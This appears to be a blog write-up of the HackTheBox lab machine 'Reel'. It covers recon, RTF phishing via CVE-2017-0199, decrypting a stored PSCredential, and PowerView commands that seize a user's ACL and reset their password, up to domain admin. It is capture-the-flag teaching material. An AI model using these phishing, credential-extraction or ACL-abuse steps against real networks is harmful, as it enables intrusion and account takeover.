---
layout: single
title: "HTB - Reel Writeup - 10.10.10.77"
date: 2020-07-19 17:49:23 +0100
categories: hackthebox
excerpt: My walkthrough / writeup of the HackTheBox Active Directory machine Reel.
---

![sizzle](/images/hackthebox-writeups/reel/htb.png)

# HackTheBox - Reel - 10.10.10.77

Reel is a Hard rated Active Directory machine on [hackthebox.eu](https://app.hackthebox.eu).

## Summary

Reel is medium to hard difficulty machine, which requires a client-side attack to bypass the perimeter, and highlights a technique for gaining privileges in an Active Directory environment.

## Recon and Scanning

### Nmap Results

{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Reel]
└──╼ $nmap -sC -sV -oN nmap/reel-init 10.10.10.77
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-20 18:28 BST
Nmap scan report for 10.10.10.77
Host is up (0.025s latency).
Not shown: 992 filtered ports
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18 12:19AM <DIR> documents
| ftp-syst:
|_ SYST: Windows*NT
22/tcp open ssh OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
| 2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
| 256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|* 256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open smtp?
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
| 220 Mail Service ready
| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
| 220 Mail Service ready
| sequence of commands
| sequence of commands
| Hello:
| 220 Mail Service ready
| EHLO Invalid domain address.
| Help:
| 220 Mail Service ready
| DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| SIPOptions:
| 220 Mail Service ready
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| sequence of commands
| TerminalServerCookie:
| 220 Mail Service ready
|_ sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49159/tcp open msrpc Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.80%I=7%D=7/20%Time=5F15D43D%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20
SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero
SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai
SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re
SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")
SF:%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindRe
SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Ma
SF:il\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n5
SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of
SF:\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc
SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\
SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2
SF:0commands\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m11s, deviation: 34m37s, median: 46s
| smb-os-discovery:
| OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
| OS CPE: cpe:/o:microsoft:windows_server_2012::-
| Computer name: REEL
| NetBIOS computer name: REEL\x00
| Domain name: HTB.LOCAL
| Forest name: HTB.LOCAL
| FQDN: REEL.HTB.LOCAL
|_ System time: 2020-07-20T18:31:58+01:00
| smb-security-mode:
| account*used: <blank>
| authentication_level: user
| challenge_response: supported
|* message*signing: required
| smb2-security-mode:
| 2.02:
|* Message signing enabled and required
| smb2-time:
| date: 2020-07-20T17:31:59
|\_ start_date: 2020-07-20T17:25:51
{% endhighlight %}

Based on the open ports I can deduce that this is a Windows Server 2008 R2 domain controller.

### Anonymous FTP Recon

As the nmap scan indicated, the FTP server accepts anonymous logon, so I will try that first.

{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Reel]
└──╼ $ftp 10.10.10.77
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18 12:19AM <DIR> documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18 12:19AM 2047 AppLocker.docx
05-28-18 02:01PM 124 readme.txt
10-31-17 10:13PM 14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> get AppLocker.docx
local: AppLocker.docx remote: AppLocker.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 9 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
2047 bytes received in 0.03 secs (76.5382 kB/s)
ftp> get readme.txt
local: readme.txt remote: readme.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
124 bytes received in 0.02 secs (5.5907 kB/s)
ftp> get "Windows Event Forwarding.docx"
local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 51 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
14581 bytes received in 0.05 secs (272.2143 kB/s)
ftp> exit
221 Goodbye.
{% endhighlight %}

We got three intresting files, `AppLocker.docx`, `readme.txt` and `Windows Event Forwarding.docx`

#### Documents

`AppLocker.docx`

- AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.

`readme.txt`

- please email me any rtf format procedures - I’ll review and convert.
- new format / converted documents will be saved here.

`Windows Event Forwarding.docx` - ExifTool

![exiftool](/images/hackthebox-writeups/reel/exiftool.png)

From the metadata we get the following email, `nico@megabank.com` this prompts us to enumerate the smtp, to enumerate valid usernames.

### SMTP Enumeration

To enumerate SMTP we will use telnet to attempt to `RCPT TO: <nico@megabank.com>` and see if the email is valid.

![valid-email](/images/hackthebox-writeups/reel/valid-email.png)

Bingo! we have a valid email, `nico@megabank.com`

## RTF Phishing

After much guessing and research there is a metasploit module that will create a malicious RTF file that could get us a meterpreter session if we phish a user and they open the file. To exploit CVE-2017-0199, we need to get the user to open a malicious RTF file, which will make an HTTP request for an HTA file. This HTA file will execute code to give us a shell.

### Metasploit Module

We will use this Metasploit Module, `exploit/windows/fileformat/office_word_hta` and the `sendEmail` program to phish the `nico@megabank.com` user and get a rev shell.

![msf-1](/images/hackthebox-writeups/reel/msf-1.png)

Now we have a lister setup we can send an email with this command

![mail-send](/images/hackthebox-writeups/reel/mail-send.png)

And a minute later, Bingo!

![shell](/images/hackthebox-writeups/reel/meterpreter-1.png)

## Priv Esc to Tom

On Nico's desktop there is a file called `cred.xml` which contains a PSCredential, we can use the `Import-CliXml` PowerShell Module tp get the user tom's plaintext password.
{% highlight powershell linenos %}
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List \*
{% endhighlight %}

![file-passwd](/images/hackthebox-writeups/reel/cred-xml.png)

### Credentials

We can now use the credentials, `tom:1ts-mag1c!!!` to login over ssh to the box.

## Tom to Claire

![tom-ssh](/images/hackthebox-writeups/reel/tom-ssh.png)

On Tom's desktop there is a folder called `AD Audit` with a Bloodhound `acls.csv` file, which we can import into Bloodhound. Firstly, we need to get the file of the machine, for this I will use Tom's credentials with FileZilla.

![filezilla](/images/hackthebox-writeups/reel/fillezilla.png)

### BloodHound Data Analysis

Now we can import it into Bloodhound with the `Upload Data` button. Note, you will need Bloodhound V1 instead of V3 to open the data, V1 can be downloaded from GitHub [here](https://github.com/BloodHoundAD/BloodHound/releases/tag/1.5.2).

![bloodhound-1](/images/hackthebox-writeups/reel/bloodhound-01.png)

We can see that we have full control over Claire, Claire also has WriteDacl writes over the Backup_Admins group so we can add Claire to that group.

![bloodhound-2](/images/hackthebox-writeups/reel/bloodhound-02.png)

### Changing Claire's Password

As we have control over Claire, we can use `PowerView.ps1` which is already on the box, to:

- Become owner of claire’s ACL's
- Get the permissions on that ACL
- Use those aquired permissions to change the password of claire
- SSH as Claire

These are the commands we will use to change Claire's Password:
{% highlight powershell %}
. .\PowerView.ps1
Set-DomainObjectOwner -identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$cred = ConvertTo-SecureString "password123!" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
{% endhighlight %}

![commands](/images/hackthebox-writeups/reel/commands.png)

### SSH as Claire

Now that we have changed claires credentials to, `claire:password123!` we can login as claire over ssh.

![claire-ssh](/images/hackthebox-writeups/reel/claire-ssh.png)

## Claire to Domain Admin

Now that we have access to claire's account we can add ourselves to the `Backup_Admins` group.

![add-command](/images/hackthebox-writeups/reel/claire-ba-add.png)

And as you can see we have access to the Administrators folder.

![icacls](/images/hackthebox-writeups/reel/icacls.png)

But no access to the root.txt, but we have access to a script called, `BackupScript.ps1` which at the top has the admin's password.

![denied](/images/hackthebox-writeups/reel/denied.png)

![da-password](/images/hackthebox-writeups/reel/admin-password.png)

## Logging In as Administrator over SSH

![root-login](/images/hackthebox-writeups/reel/root-login.png)

## User and Root Flags

We can also now get the root and user flags.

{% highlight powershell linenos %}
type \users\administrator\desktop\root.txt
type \users\nico\desktop\user.txt
{% endhighlight %}

![flags](/images/hackthebox-writeups/reel/flags.png)

## Pwned

![pwned](/images/hackthebox-writeups/reel/pwned.png)

## Respect

If you enjoyed my write up or found it useful consider +repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)
